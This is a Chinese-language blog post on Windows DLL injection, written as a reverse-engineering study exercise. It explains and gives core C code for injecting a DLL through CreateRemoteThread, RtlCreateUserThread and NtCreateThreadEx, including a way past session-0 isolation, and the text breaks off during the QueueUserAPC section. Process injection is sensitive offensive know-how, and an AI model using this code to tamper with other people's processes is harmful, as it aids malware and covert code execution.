<!doctype html><html lang=zh-cn>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=robots content="noodp">
<meta http-equiv=x-ua-compatible content="IE=edge, chrome=1">
<title>常用DLL注入技术解析 - 栖迟於一丘</title><meta name=Description content><meta property="og:title" content="常用DLL注入技术解析">
<meta property="og:description" content="0x0 前言 纸上得来终觉浅，DLL注入光听书中说总是不过瘾，于是自己动手写一写代码。这也是我第一次写Windows编程，虽然都是C语言，但变量类型">
<meta property="og:type" content="article">
<meta property="og:url" content="http://int80.top/dllinjection/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-03-24T00:00:00+00:00">
<meta property="article:modified_time" content="2022-03-24T00:00:00+00:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="常用DLL注入技术解析">
<meta name=twitter:description content="0x0 前言 纸上得来终觉浅，DLL注入光听书中说总是不过瘾，于是自己动手写一写代码。这也是我第一次写Windows编程，虽然都是C语言，但变量类型">
<meta name=application-name content="INT80">
<meta name=apple-mobile-web-app-title content="INT80"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=/mstile-150x150.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://int80.top/dllinjection/><link rel=prev href=http://int80.top/010editorcracker/><link rel=next href=http://int80.top/hooktechnique/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"常用DLL注入技术解析","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/int80.top\/dllinjection\/"},"genre":"posts","keywords":"逆向","wordcount":21552,"url":"http:\/\/int80.top\/dllinjection\/","datePublished":"2022-03-24T00:00:00+00:00","dateModified":"2022-03-24T00:00:00+00:00","publisher":{"@type":"Organization","name":"ShiDong"},"author":{"@type":"Person","name":"ShiDong"},"description":""}</script></head>
<body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':''==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:''==='dark')&&document.body.setAttribute('theme','dark')</script>
<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
<div class=header-wrapper>
<div class=header-title>
<a href=/ title=栖迟於一丘><img class="lazyload logo" src=/svg/loading.min.svg data-src=/1.png data-srcset="/1.png, /1.png 1.5x, /1.png 2x" data-sizes=auto alt=/1.png title=/1.png>INT80</a>
</div>
<div class=menu>
<div class=menu-inner><a class=menu-item href=/posts/> Posts </a><a class=menu-item href=/tags/> Tags </a><a class=menu-item href=/categories/> Categories </a><a class=menu-item href=/aboutme/> About Me </a><a class=menu-item href=/search/><i class="fas fa-fw fa-search"></i> search </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
</a>
</div>
</div>
</div>
</header><header class=mobile id=header-mobile>
<div class=header-container>
<div class=header-wrapper>
<div class=header-title>
<a href=/ title=栖迟於一丘><img class="lazyload logo" src=/svg/loading.min.svg data-src=/1.png data-srcset="/1.png, /1.png 1.5x, /1.png 2x" data-sizes=auto alt=/1.png title=/1.png>INT80</a>
</div>
<div class=menu-toggle id=menu-toggle-mobile>
<span></span><span></span><span></span>
</div>
</div>
<div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/aboutme/ title>About Me</a><a class=menu-item href=/search/ title><i class="fas fa-fw fa-search"></i>search</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
</a></div>
</div>
</header>
<div class="search-dropdown desktop">
<div id=search-dropdown-desktop></div>
</div>
<div class="search-dropdown mobile">
<div id=search-dropdown-mobile></div>
</div>
<main class=main>
<div class=container>
<div class=toc id=toc-auto>
<h2 class=toc-title>目录</h2>
<div class=toc-content id=toc-content-auto></div>
</div><article class="page single"><h1 class="single-title animated flipInX">常用DLL注入技术解析</h1><div class=post-meta>
<div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>ShiDong</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/%E9%80%86%E5%90%91/><i class="far fa-folder fa-fw"></i>逆向</a></span></div>
<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-03-24>2022-03-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 21552 字
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 44 分钟&nbsp;</div>
</div><div class="details toc" id=toc-static kept>
<div class="details-summary toc-title">
<span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span>
</div>
<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
<ul>
<li>
<ul>
<li>
<ul>
<li><a href=#0x0-前言>0x0 前言</a></li>
<li><a href=#0x1-何为dll注入>0x1 何为DLL注入</a></li>
<li><a href=#0x2-createremotethread-rtlcreateuserthread-and-ntcreatethreadex>0x2 CreateRemoteThread, RtlCreateUserThread and NtCreateThreadEx</a>
<ul>
<li><a href=#0x21createremotethread>0x2.1CreateRemoteThread</a></li>
<li><a href=#0x22-rtlcreateuserthread>0x2.2 RtlCreateUserThread</a></li>
<li><a href=#0x23-ntcreatethreadex>0x2.3 NtCreateThreadEx</a></li>
</ul>
</li>
<li><a href=#0x3-queueuserapc>0x3 QueueUserAPC</a></li>
<li><a href=#0x4-setwindowshookex>0x4 SetWindowsHookEx</a></li>
<li><a href=#0x5-reflective-injection>0x5 Reflective Injection</a></li>
<li><a href=#0x6-静态dll注入>0x6 静态DLL注入</a></li>
<li><a href=#0x7-线程劫持注入实现失败并且未能找出问题所在>0x7 线程劫持注入(实现失败，并且未能找出问题所在)</a></li>
<li><a href=#0x8-总结>0x8 总结</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav></div>
</div><div class=content id=content><h4 id=0x0-前言>0x0 前言</h4>
<p>纸上得来终觉浅，DLL注入光听书中说总是不过瘾，于是自己动手写一写代码。这也是我第一次写Windows编程，虽然都是C语言，但变量类型，API却一点也不了解。可是做Windows逆向不会Windows编程怎么行呢？于是这个小项目也用来入门Windows编程，熟悉一些常用写法和API。后面在实现API Hook时，我也是通过这个DLL 注入工具进行HOOK测试。</p>
<p>这个小项目是参考了injectAllTheThings项目，以及《核心原理》DLL注入部分内容编写完成的，其中的反射式DLL注入是参考了作者stephenfewer开源代码完成。参考项目链接都放在后面了。</p>
<p>我实现了五种注入方法，如下图所示</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=ToolUsage.png data-srcset="/dllinjection/ToolUsage.png, ToolUsage.png 1.5x, /dllinjection/ToolUsage.png 2x" data-sizes=auto alt=/dllinjection/ToolUsage.png title=ToolUsage></p>
<p>同时还实现了向全进程注入以及卸载DLL的功能。</p>
<p>为了再次强化学习DLL注入的知识，再加上网上对这个技术分析的文章质量实在不敢恭维，因此自己就想把自己的学习过程以及对这个技术的理解尽可能高质量的清晰地写出来。</p>
<p>该博客里的代码并不完整，可以将项目的代码对着博客理解。</p>
<p>项目地址：</p>
<p><a href=https://github.com/Mrsdwang/LittleDllInjectionTool target=_blank rel="noopener noreffer">DllInJectionTool</a></p>
<p>参考项目：</p>
<p><a href=https://github.com/DanielRTeixeira/injectAllTheThings target=_blank rel="noopener noreffer">injectAllTheThings</a></p>
<p><a href=https://github.com/stephenfewer/ReflectiveDLLInjection target=_blank rel="noopener noreffer">ReflectiveDLLInjection</a></p>
<h4 id=0x1-何为dll注入>0x1 何为DLL注入</h4>
<p>先简单介绍一下什么是DLL, DLL(Dynamic Linked Library，动态链接库)的存在是为了解决因库函数多次被程序加载至内存导致内存浪费的情况。当一个DLL首次被进程加载后，该DLL的代码以及资源就可以实现共享，允许其他的进程使用。</p>
<p>DLL还有一个特性，当DLL被加载到进程内存空间后会自动执行DllMain()函数，只要将想要程序执行的代码写入DllMain函数中，当该DLL被加载后这些代码就会自动执行，这也就是DLL注入的原理。</p>
<p>因此DLL注入聚焦于如何让已经运行的程序加载外部DLL。同时，会在最后更改PE文件数据，通过静态方法让PE文件在启动时自动加载目标DLL。</p>
<h4 id=0x2-createremotethread-rtlcreateuserthread-and-ntcreatethreadex>0x2 CreateRemoteThread, RtlCreateUserThread and NtCreateThreadEx</h4>
<h5 id=0x21createremotethread>0x2.1CreateRemoteThread</h5>
<p>通过CreateRemoteThread函数来实现DLL注入是非常经典的方法。该方法的实现思路如下，首先为DLL路径字符串申请内存空间，将DLL路径写入目标进程的内存中，并通过GetProcAddress获得LoadLibrary函数地址，最后通过CreateRemoteThread函数在目标进程创建一个线程，这个线程函数就是LoadLibrary，而DLL路径字符串作为线程函数的参数传入。那么就能让目标进程运行LoadLibrary函数加载目标DLL，从而实现DLL注入。</p>
<p>流程图如下：</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=CreateRemoteThread.png data-srcset="/dllinjection/CreateRemoteThread.png, CreateRemoteThread.png 1.5x, /dllinjection/CreateRemoteThread.png 2x" data-sizes=auto alt=/dllinjection/CreateRemoteThread.png title=CreateRemoteThread></p>
<p>核心代码如下:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 获取目标进程句柄
</span><span class=c1></span><span class=n>hProcess</span> <span class=o>=</span> <span class=n>OpenProcess</span><span class=p>(</span><span class=n>dwDesireAccess</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=n>dwPID</span><span class=p>);</span>
<span class=c1>// 申请DLL路径字符串长度的内存空间
</span><span class=c1></span><span class=n>pRemoteBuf</span> <span class=o>=</span> <span class=n>VirtualAllocEx</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>dwBuffSize</span><span class=p>,</span> <span class=n>MEM_COMMIT</span> <span class=o>|</span> <span class=n>MEM_RESERVE</span><span class=p>,</span> <span class=n>PAGE_READWRITE</span><span class=p>);</span>
<span class=c1>// 将DLL路径字符串写入申请的内存空间中
</span><span class=c1></span><span class=n>WriteProcessMemory</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>pRemoteBuf</span><span class=p>,</span> <span class=p>(</span><span class=n>LPCVOID</span><span class=p>)</span><span class=n>szDllPath</span><span class=p>,</span> <span class=n>dwBuffSize</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
<span class=c1>// 获取LoadLibrary函数地址
</span><span class=c1></span><span class=n>hMod</span> <span class=o>=</span> <span class=n>GetModuleHandle</span><span class=p>(</span><span class=sa>L</span><span class=s>&#34;kernel32.dll&#34;</span><span class=p>);</span>
<span class=n>hThreadProc</span> <span class=o>=</span> <span class=p>(</span><span class=n>LPTHREAD_START_ROUTINE</span><span class=p>)</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>hMod</span><span class=p>,</span> <span class=s>&#34;LoadLibraryW&#34;</span><span class=p>);</span>
<span class=c1>// 创建远程线程运行LoadLibrary函数实现DLL的加载
</span><span class=c1></span><span class=n>hThread</span> <span class=o>=</span> <span class=n>CreateRemoteThread</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>pThreadProc</span><span class=p>,</span> <span class=n>pRemoteBuf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><h5 id=0x22-rtlcreateuserthread>0x2.2 RtlCreateUserThread</h5>
<p>我并没有在MSDN中查找到这个函数的定义，在网上搜索得到的信息说这个函数是未公开的。因此只能通过网上流出的该函数的信息进行定义后使用，也可自己去逆向出该函数的参数等一些信息。</p>
<p>RtlCreateUserThread函数与CreateRemoteThread函数类似，最终都会调用NtCreateThreadEx函数来创建进程实体。</p>
<p>因此该函数实现流程与CreateRemoteThread无异，但因为其是未导出的函数，我们无法直接调用RtlCreateUserThread函数，需要自己定义RtlCreateUserThread函数，并且需要通过GetProcAddress函数获得其地址后才能调用。</p>
<p>流程图如下:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=RtlCreateUserThread.png data-srcset="/dllinjection/RtlCreateUserThread.png, RtlCreateUserThread.png 1.5x, /dllinjection/RtlCreateUserThread.png 2x" data-sizes=auto alt=/dllinjection/RtlCreateUserThread.png title=RtlCreateUserThread></p>
<p>首先定义RtlCreateUserThread函数:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=k>typedef</span> <span class=nf>DWORD</span><span class=p>(</span><span class=n>WINAPI</span><span class=o>*</span> <span class=n>pRtlCreateUserThread</span><span class=p>)(</span>
	<span class=n>IN</span> <span class=n>HANDLE</span> 					<span class=n>ProcessHandle</span><span class=p>,</span>
	<span class=n>IN</span> <span class=n>PSECURITY_DESCRIPTOR</span> 	<span class=n>SecurityDescriptor</span><span class=p>,</span>
	<span class=n>IN</span> <span class=n>BOOL</span> 					<span class=n>CreateSuspended</span><span class=p>,</span>
	<span class=n>IN</span> <span class=n>ULONG</span>					<span class=n>StackZeroBits</span><span class=p>,</span>
	<span class=n>IN</span> <span class=n>OUT</span> <span class=n>PULONG</span>				<span class=n>StackReserved</span><span class=p>,</span>
	<span class=n>IN</span> <span class=n>OUT</span> <span class=n>PULONG</span>				<span class=n>StackCommit</span><span class=p>,</span>
	<span class=n>IN</span> <span class=n>LPVOID</span>					<span class=n>StartAddress</span><span class=p>,</span>
	<span class=n>IN</span> <span class=n>LPVOID</span>					<span class=n>StartParameter</span><span class=p>,</span>
	<span class=n>OUT</span> <span class=n>HANDLE</span> 					<span class=n>ThreadHandle</span><span class=p>,</span>
	<span class=n>OUT</span> <span class=n>LPVOID</span>					<span class=n>ClientID</span>
	<span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><p>核心代码如下:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 获取目标进程句柄
</span><span class=c1></span><span class=n>hProcess</span> <span class=o>=</span> <span class=n>OpenProcess</span><span class=p>(</span><span class=n>dwDesireAccess</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=n>dwPID</span><span class=p>);</span>
<span class=c1>// 申请DLL路径字符串长度的内存空间
</span><span class=c1></span><span class=n>pRemoteBuf</span> <span class=o>=</span> <span class=n>VirtualAllocEx</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>dwBuffSize</span><span class=p>,</span> <span class=n>MEM_COMMIT</span> <span class=o>|</span> <span class=n>MEM_RESERVE</span><span class=p>,</span> <span class=n>PAGE_READWRITE</span><span class=p>);</span>
<span class=c1>// 将DLL路径字符串写入申请的内存空间中
</span><span class=c1></span><span class=n>WriteProcessMemory</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>pRemoteBuf</span><span class=p>,</span> <span class=p>(</span><span class=n>LPCVOID</span><span class=p>)</span><span class=n>szDllPath</span><span class=p>,</span> <span class=n>dwBuffSize</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
<span class=c1>// 获取LoadLibrary函数地址
</span><span class=c1></span><span class=n>hMod</span> <span class=o>=</span> <span class=n>GetModuleHandle</span><span class=p>(</span><span class=sa>L</span><span class=s>&#34;kernel32.dll&#34;</span><span class=p>);</span>
<span class=n>hThreadProc</span> <span class=o>=</span> <span class=p>(</span><span class=n>LPTHREAD_START_ROUTINE</span><span class=p>)</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>hMod</span><span class=p>,</span> <span class=s>&#34;LoadLibraryW&#34;</span><span class=p>);</span>
<span class=c1>// 获取RtlCreateUserThread函数的地址
</span><span class=c1></span><span class=n>RtlCreateUserThread</span> <span class=o>=</span> <span class=p>(</span><span class=n>pRtlCreateUserThread</span><span class=p>)</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>GetModuleHandle</span><span class=p>(</span><span class=sa>L</span><span class=s>&#34;ntdll.dll&#34;</span><span class=p>),</span> <span class=s>&#34;RtlCreateUserThread&#34;</span><span class=p>);</span>
<span class=c1>// 调用RtlCreateUserThread函数
</span><span class=c1></span><span class=n>Status</span> <span class=o>=</span> <span class=p>(</span><span class=n>BOOL</span><span class=p>)</span><span class=n>RtlCreateUserThread</span><span class=p>(</span>
	<span class=n>hProcess</span><span class=p>,</span>
	<span class=nb>NULL</span><span class=p>,</span>
	<span class=mi>0</span><span class=p>,</span>
	<span class=mi>0</span><span class=p>,</span>
	<span class=mi>0</span><span class=p>,</span>
	<span class=mi>0</span><span class=p>,</span>
	<span class=n>hThreadProc</span><span class=p>,</span>
	<span class=n>pRemoteBuf</span><span class=p>,</span>
	<span class=o>&amp;</span><span class=n>hRemoteThread</span><span class=p>,</span> <span class=c1>//通过RtlCreateUserThread创建的线程句柄
</span><span class=c1></span>	<span class=nb>NULL</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><h5 id=0x23-ntcreatethreadex>0x2.3 NtCreateThreadEx</h5>
<p>前面两个函数CreateRemoteThread 以及 RtlCreateUserThread 都是 NtCreateThreadEx函数的封装。经过调试会发现CreateRemoteThread函数与RtlCreateUserThread函数执行最后，都进入了NtCreateThreadEx函数，并在该函数通过SYSENTER指令进入了内核模式。</p>
<p>在Windows vista以后，Windows对系统服务和登录用户进行了会话隔离，即系统服务属于会话0，第一个登陆系统的用户为会话1。如果会话1的用户尝试向会话0的进程创建远程进程就会失败。原因是在Windows XP以后，CreateRemoteThread内部实现算法采取了挂起模式。当会话0的进程被创建远程线程时，会采取挂起模式创建，然后会进行判断被创建远程线程的进程是否属于会话0并且发起注入的进程和目标进程是不是属于同一个会话。如果不属于相同的会话，那么对会话0创建的远程线程就不会被CsrClientCallServer函数进行登记的操作，这就导致挂起创建的进程不会恢复运行，而是直接返回错误，这就是利用CreateRemoteThread函数对会话0的进程进行注入会失败的原因。</p>
<p>通过调试CreateRemoteThread函数可知，当执行完NtCreateThreadEx后，会创建出线程句柄，并且该函数会根据第七个参数的值来决定该线程是否以挂起模式创建。当通过CreateRemoteThread函数向会话0进程创建远程线程操作中，当调用NtCraeteThreadEx函数时，第七个参数为TRUE，即以挂起模式创建，因此必须通过在KernelBase!CreateRemoteThreadEx中的CsrClientCallServer 以及 ZwResumeThread 函数唤醒线程。如果直接通过NtCreateThreadEx函数不以挂起模式(第七参数为FALSE)创建线程，那么就能跳过会话隔离造成的注入失败情况。</p>
<p>NtCreateThreadEx函数同样是未公开的函数，有可能会在以后被改变，因此之后该方法有可能失效。同RtlCreateUserThread函数一样，我们需要定义NtCreateThreadEx函数，方法也是网上搜集信息或者自己逆向出来。</p>
<p>流程图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=NtCreateThreadEx.png data-srcset="/dllinjection/NtCreateThreadEx.png, NtCreateThreadEx.png 1.5x, /dllinjection/NtCreateThreadEx.png 2x" data-sizes=auto alt=/dllinjection/NtCreateThreadEx.png title=NtCreateThreadEx></p>
<p>对NtCreateThreadEx函数的定义如下(32位以及64位不同)：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 64位用
</span><span class=c1></span><span class=k>typedef</span> <span class=nf>NTSTATUS</span><span class=p>(</span><span class=n>WINAPI</span><span class=o>*</span> <span class=n>LPFUN_NtCreateThreadEx</span><span class=p>)(</span>
	<span class=n>PHANDLE</span> <span class=n>hThread</span><span class=p>,</span>
	<span class=n>ACCESS_MASK</span> <span class=n>DesireAccess</span><span class=p>,</span>
	<span class=n>LPVOID</span> <span class=n>ObjectAttributes</span><span class=p>,</span>
	<span class=n>HANDLE</span> <span class=n>ProcessHandle</span><span class=p>,</span>
	<span class=n>LPTHREAD_START_ROUTINE</span> <span class=n>lpstartAddress</span><span class=p>,</span>
	<span class=n>LPVOID</span> <span class=n>lpParameter</span><span class=p>,</span>
	<span class=n>ULONG</span> <span class=n>CreateThreadFlags</span><span class=p>,</span>
	<span class=n>SIZE_T</span> <span class=n>ZeroBits</span><span class=p>,</span>
	<span class=n>SIZE_T</span> <span class=n>StackSize</span><span class=p>,</span>
	<span class=n>SIZE_T</span> <span class=n>MaximumStackSize</span><span class=p>,</span>
	<span class=n>LPVOID</span> <span class=n>lpBytesBuffer</span>
	<span class=p>);</span>
	
<span class=c1>// 32位用
</span><span class=c1></span><span class=k>typedef</span> <span class=nf>NTSTATUS</span><span class=p>(</span><span class=n>WINAPI</span><span class=o>*</span> <span class=n>LPFUN_NtCreateThreadEx</span><span class=p>)(</span>
	<span class=n>PHANDLE</span> <span class=n>hThread</span><span class=p>,</span>
	<span class=n>ACCESS_MASK</span> <span class=n>DesireAccess</span><span class=p>,</span>
	<span class=n>LPVOID</span> <span class=n>ObjectAttributes</span><span class=p>,</span>
	<span class=n>HANDLE</span> <span class=n>ProcessHandle</span><span class=p>,</span>
	<span class=n>LPTHREAD_START_ROUTINE</span> <span class=n>lpstartAddress</span><span class=p>,</span>
	<span class=n>LPVOID</span> <span class=n>lpParameter</span><span class=p>,</span>
	<span class=n>BOOL</span> <span class=n>CreateSuspended</span><span class=p>,</span>
	<span class=n>ULONG</span> <span class=n>StackZeroBits</span><span class=p>,</span>
	<span class=n>ULONG</span> <span class=n>SizeOfStackCommit</span><span class=p>,</span>
	<span class=n>ULONG</span> <span class=n>SizeOfStackReserve</span><span class=p>,</span>
	<span class=n>LPVOID</span> <span class=n>lpBytesBuffer</span>
	<span class=p>);</span>	
</code></pre></td></tr></table>
</div>
</div><p>核心代码：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 获取目标进程句柄
</span><span class=c1></span><span class=n>hProcess</span> <span class=o>=</span> <span class=n>OpenProcess</span><span class=p>(</span><span class=n>dwDesireAccess</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=n>dwPID</span><span class=p>);</span>
<span class=c1>// 申请DLL路径字符串长度的内存空间
</span><span class=c1></span><span class=n>pRemoteBuf</span> <span class=o>=</span> <span class=n>VirtualAllocEx</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>dwBuffSize</span><span class=p>,</span> <span class=n>MEM_COMMIT</span> <span class=o>|</span> <span class=n>MEM_RESERVE</span><span class=p>,</span> <span class=n>PAGE_READWRITE</span><span class=p>);</span>
<span class=c1>// 将DLL路径字符串写入申请的内存空间中
</span><span class=c1></span><span class=n>WriteProcessMemory</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>pRemoteBuf</span><span class=p>,</span> <span class=p>(</span><span class=n>LPCVOID</span><span class=p>)</span><span class=n>szDllPath</span><span class=p>,</span> <span class=n>dwBuffSize</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
<span class=c1>// 获取LoadLibrary函数地址
</span><span class=c1></span><span class=n>hMod</span> <span class=o>=</span> <span class=n>GetModuleHandle</span><span class=p>(</span><span class=sa>L</span><span class=s>&#34;kernel32.dll&#34;</span><span class=p>);</span>
<span class=n>hThreadProc</span> <span class=o>=</span> <span class=p>(</span><span class=n>LPTHREAD_START_ROUTINE</span><span class=p>)</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>hMod</span><span class=p>,</span> <span class=s>&#34;LoadLibraryW&#34;</span><span class=p>);</span>
<span class=c1>// 获取NtCreateThreadEx函数地址
</span><span class=c1></span><span class=n>pFunc</span> <span class=o>=</span> <span class=n>GetProcAddress</span><span class=p>(</span><span class=n>GetModuleHandle</span><span class=p>(</span><span class=sa>L</span><span class=s>&#34;ntdll.dll&#34;</span><span class=p>),</span> <span class=s>&#34;NtCreateThreadEx&#34;</span><span class=p>);</span>
<span class=c1>// 调用NtCreateThreadEx函数
</span><span class=c1></span><span class=p>((</span><span class=n>LPFUN_NtCreateThreadEx</span><span class=p>)</span><span class=n>pFunc</span><span class=p>)</span>
			<span class=p>(</span><span class=o>&amp;</span><span class=n>hThread</span><span class=p>,</span>
			<span class=mh>0x1FFFFF</span><span class=p>,</span>
			<span class=nb>NULL</span><span class=p>,</span>
			<span class=n>hProcess</span><span class=p>,</span>
			<span class=n>pThreadProc</span><span class=p>,</span>
			<span class=n>pRemoteBuf</span><span class=p>,</span>
			<span class=n>FALSE</span><span class=p>,</span> <span class=c1>// 该参数决定了是否以挂起模式创建线程.1挂起,0运行.
</span><span class=c1></span>			<span class=nb>NULL</span><span class=p>,</span>
			<span class=nb>NULL</span><span class=p>,</span>
			<span class=nb>NULL</span><span class=p>,</span>
			<span class=nb>NULL</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><h4 id=0x3-queueuserapc>0x3 QueueUserAPC</h4>
<p>APC(异步调用过程)是一种软中断机制，当一个线程从等待状态苏醒时就会检测是否有APC交给自己，如果有就会优先执行APC过程。利用这种机制，我们通过向线程添加APC过程，从而让程序执行实现DLL注入的函数。我们通过QueueUserAPC函数向线程添加APC过程，而我们的APC过程执行函数为LoadLibrary，传入的参数为DLL路径字符串。</p>
<p>那么这里就有一个问题，我们没有办法保证一个线程一定会有可唤醒状态，因此为了提高调用几率，我们需要向目标进程的所有线程都添加该APC过程。而这又引起了一个问题，就是会导致DLL会被多次注入，那么当我们卸载DLL时也需要卸载相同次数。</p>
<p>流程图：</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=QueueUserAPC.png data-srcset="/dllinjection/QueueUserAPC.png, QueueUserAPC.png 1.5x, /dllinjection/QueueUserAPC.png 2x" data-sizes=auto alt=/dllinjection/QueueUserAPC.png title=QueueUserAPC></p>
<p>核心代码:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
